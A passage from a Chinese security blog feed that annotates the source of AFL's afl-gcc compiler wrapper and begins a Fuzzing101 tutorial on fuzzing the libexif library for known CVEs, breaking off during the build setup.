class="comment">   If you want to call a non-default compiler as a next step of the chain,</span></span><br><span class="line"><span class="comment">   specify its location via AFL_CC or AFL_CXX.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AFL_MAIN</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;alloc-inl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8*  as_path;                <span class="comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span></span><br><span class="line"><span class="keyword">static</span> u8** cc_params;              <span class="comment">/* Parameters passed to the real CC  */</span></span><br><span class="line"><span class="keyword">static</span> u32  cc_par_cnt = <span class="number">1</span>;         <span class="comment">/* Param count, including argv0      */</span></span><br><span class="line"><span class="keyword">static</span> u8   be_quiet,               <span class="comment">/* Quiet mode                        */</span></span><br><span class="line">            clang_mode;             <span class="comment">/* Invoked as afl-clang*?            */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try to find our &quot;fake&quot; GNU assembler in AFL_PATH or at the location derived</span></span><br><span class="line"><span class="comment">   from argv[0]. If that fails, abort. */</span></span><br><span class="line"><span class="comment">//find_as函数通过argv[0](也就是当前文件的路径)寻找对应的汇编器as(linux中常用的一款汇编器，负责把汇编代码翻译成二进制)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find_as</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 *afl_path = getenv(<span class="string">&quot;AFL_PATH&quot;</span>);<span class="comment">//获取环境中 AFL_PATH 变量</span></span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"><span class="comment">//如果 AFL_PATH 变量获取成功</span></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;                   </span><br><span class="line"></span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/as&quot;</span>, afl_path);<span class="comment">//利用alloc_printf函数动态分配一段空间来存储对应路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123; <span class="comment">//检查路径是否能访问</span></span><br><span class="line">      as_path = afl_path;<span class="comment">//如果可以就将afl_path路径赋给as_path</span></span><br><span class="line">      ck_free(tmp);<span class="comment">//释放掉alloc_printf函数分配的内存</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ck_free(tmp);<span class="comment">//路径不能访问就直接释放内存</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//如果 AFL_PATH 变量获取失败</span></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>); <span class="comment">//匹配argv[0]，提取当前路径dir</span></span><br><span class="line"><span class="comment">//说的通俗点就是会检查路径(如%HOME/AFL/afl-gcc)中是否存在&#x27;/&#x27;，如果存在就取最后&#x27;/&#x27;前面的字符串作为dir</span></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;<span class="comment">//如果获取到当前路径的dir</span></span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    *slash = <span class="number">0</span>;</span><br><span class="line">    dir = ck_strdup(argv0);</span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/afl-as&quot;</span>, dir);<span class="comment">//alloc_printf为dir开辟空间存放路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123;<span class="comment">//检测路径&#123;dir&#125;/afl是否可访问</span></span><br><span class="line">      as_path = dir;<span class="comment">//如果可以就将dir路径赋给as_path</span></span><br><span class="line">      ck_free(tmp);<span class="comment">//释放alloc_printf函数分配的内存</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ck_free(tmp);<span class="comment">//路径不能访问就直接释放内存</span></span><br><span class="line">    ck_free(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//如果前两种都没有成功则直接找as</span></span><br><span class="line">  <span class="keyword">if</span> (!access(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;<span class="comment">//检验是否能找到</span></span><br><span class="line">    as_path = AFL_PATH;<span class="comment">//找到了就直接赋值</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//没找到报错</span></span><br><span class="line">  FATAL(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"><span class="comment">//该函数主要是用来设置 CC 参数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">//给cc_params分配空间，cc_params是保存编译参数的数组</span></span><br><span class="line">  cc_params = ck_alloc((argc + <span class="number">128</span>) * <span class="keyword">sizeof</span>(u8*));</span><br><span class="line">  <span class="comment">//获取最右边(后面)第一次出现&#x27;/&#x27;的位置并赋值给name</span></span><br><span class="line">  <span class="comment">//strchr是获取最左边</span></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line">  <span class="comment">//如果是afl-clang开头</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">    <span class="comment">//将clang_mode赋值为1，之后判断是 afl-clang++ 还是 afl-clang</span></span><br><span class="line">    clang_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    setenv(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//如果是afl-clang++</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;</span><br><span class="line">      <span class="comment">//获取环境变量 AFL_CXX</span></span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      <span class="comment">//获取到了就赋值，没获取到就直接赋字符串&#x27;clang++&#x27;</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果不是afl-clang++，即 afl-clang</span></span><br><span class="line">      <span class="comment">//获取环境变量 AFL_CC</span></span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      <span class="comment">//获取到了就赋值，没获取到就直接赋字符串&#x27;clang&#x27;</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"><span class="comment">//如果不是afl_clang开头，并且是Apple平台，就会进入这个分支</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="comment">//是否是afl-g++，是则获取变量并赋值</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="comment">//是否是afl-gcj，获取变量并赋值</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="comment">//如果前两种都不满足，则直接获取AFL_CC变量给cc_params[0]</span></span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="comment">//都没匹配到就报错</span></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      FATAL(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span><span class="comment">//不是Apple平台</span></span></span><br><span class="line">    <span class="comment">//判断是不是afl-g++,是就赋值，同141行，就不多说了</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//进入while循环，遍历参数</span></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);<span class="comment">//扫描argv[]，将参数放入cc_params</span></span><br><span class="line">    <span class="comment">//如果扫描到了-B</span></span><br><span class="line">    <span class="comment">//-B 用于设置编译器的搜索路径</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">      <span class="comment">//跳过，因为find_as已经处理过了</span></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) WARNF(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扫描到 -integrated-as跳过</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="comment">//扫到-pipe跳过</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)<span class="comment">//判断如果是FreeBSD系统或者64位系统</span></span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;<span class="comment">//当参数是-m32时，设置参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//扫描到-fsanitize=address 或 -fsanitize=memory，设置参数，并且会告诉gcc要检查内存访问错误</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//扫描到FORTIFY_SOURCE，设置参数</span></span><br><span class="line">    <span class="comment">//FORIFY_SOURE在使用各种字符串和内存操作功能时执行一些轻量级检查，以检查缓冲区溢出错误</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//将参数传入cc_params</span></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//跳出循环后，给cc_params加上-B和as_path</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;</span><br><span class="line">  <span class="comment">//检查clang_mode的值，之前检查是不是clang有设置过</span></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    <span class="comment">//如果时clang就在cc_params后面再加上-no-integrated-as</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br><span class="line">  <span class="comment">//如果环境变量中有AFL_HARDEN</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">//就在cc_params后面再加上-fstack-protector-all</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line">    <span class="comment">//如果没有设置fortify_set，则在cc_params后面再加上-D_FORTIFY_SOURCE=2</span></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果通过 -fsanitize= 设置了asan_set(判断是否检查内存)</span></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line">    <span class="comment">//设置环境变量 AFL_USE_ASAN = 1 </span></span><br><span class="line">    setenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//如果设置了AFL_USE_ASAN</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">//检测AFL_USE_MSAN，设置了就报错，因为两者互斥</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="comment">//检测AFL_HARDEN，设置了就报错</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="comment">//如果没有设置以上两者，就添加这两个选项</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line">  <span class="comment">//如果设置了AFL_USE_MSAN</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">//检测AFL_USE_ASAN，设置了就报错，因为互斥</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="comment">//检测AFL_HARDEN，设置了就报错</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="comment">//如果没有设置以上两者，就添加这两个选项</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//接下来对于优化选项进行判断</span></span><br><span class="line">  <span class="comment">//如果没有设置AFL_DONT_OPTIMIZE(也就是允许优化)</span></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line">  <span class="comment">//如果是FreeBSD系统或者64位系统，进入分支</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)<span class="comment">//如果没有设置clang模式或者没有设置-m32参数则进入分支</span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;<span class="comment">//cc_params中追加“-g”参数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span><span class="comment">//如果不是上述两种系统</span></span></span><br><span class="line"></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;<span class="comment">//cc_params中追加“-g”参数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//追加一系列参数</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果设置了AFL_NO_BUILTIN(不允许优化)</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">//追加参数</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//最后补上NULL标志结束</span></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//查找汇编器</span></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">//参数处理，将确定好的参数放入cc_params[] 数组</span></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line">  <span class="comment">//执行afl-gcc</span></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);</span><br><span class="line">  <span class="comment">//报错</span></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考博客：</p><p><a href="https://bbs.pediy.com/thread-265936.htm#msg_header_h2_1">https://bbs.pediy.com/thread-265936.htm#msg_header_h2_1</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/121268909">https://blog.csdn.net/qq_41202237/article/details/121268909</a></p><p><a href="https://blog.csdn.net/sls_xsl/article/details/114379402">https://blog.csdn.net/sls_xsl/article/details/114379402</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101-exe2</title>
      <link href="/2022/03/03/Fuzzing101-exe2/"/>
      <url>/2022/03/03/Fuzzing101-exe2/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p> 本文是 Fuzzing101 训练的第二篇，fuzz 对象是 libexif 库，目标是找到 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895">CVE-2009-3895</a> 的崩溃/PoC 和 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836">CVE-2012-2836</a> 的另一个崩溃</p><ul><li>CVE-2009-3895：堆的缓冲区溢出，可以使用无效的 EXIF 图像触发</li><li>CVE-2012-2836：是一个越界读取漏洞，可以通过带有精心制作的 EXIF 标签的图像触发</li></ul><h2 id="将会学到的知识"><a href="#将会学到的知识" class="headerlink" title="将会学到的知识"></a>将会学到的知识</h2><ul><li>对使用了外部库的应用进行 fuzz</li><li>使用 <code>afl-clang-lto</code> 进行 fuzz，它比 <code>afl-clang-fast</code> 的速度更快</li><li>使用 Eclipse IDE 进行动态调试</li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol><li>寻找使用了 <code>libexif</code> 库的应用接口</li><li>创建 exif 样例的种子语料库</li><li>使用 afl-clang-lto 编译 libexif 和选择的应用程序</li><li>对 libexif 进行fuzz</li><li>对 crash 进行分类过滤，确认每个漏洞的 PoC</li><li>修复漏洞</li></ol><h2 id="环境与搭建"><a href="#环境与搭建" class="headerlink" title="环境与搭建"></a>环境与搭建</h2><p>工具还是使用的 AFL++，具体安装在 exe1 中已经写过了，这里就不多赘述了，只说一下 libexif 安装</p><h3 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h3><p>先为项目创建一个文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_libexif &amp;&amp; cd fuzzing_libexif&#x2F;</span><br></pre></td></tr></table></figure><p>然后就是创建 libexif 环境了(官方给出的 libcxif 版本是 14 版本的，但是我试了很多次 make install 都会报错，看了网上其他师傅的博客发现 15 版本也可以，就直接用了)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 下载</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;libexif&#x2F;libexif&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;libexif-0_6_15-release.tar.gz</span><br><span class="line">tar -xzvf libexif-0_6_15-release.tar.gz</span><br><span class="line"></span><br><span class="line"># 构建并安装</span><br><span class="line">cd 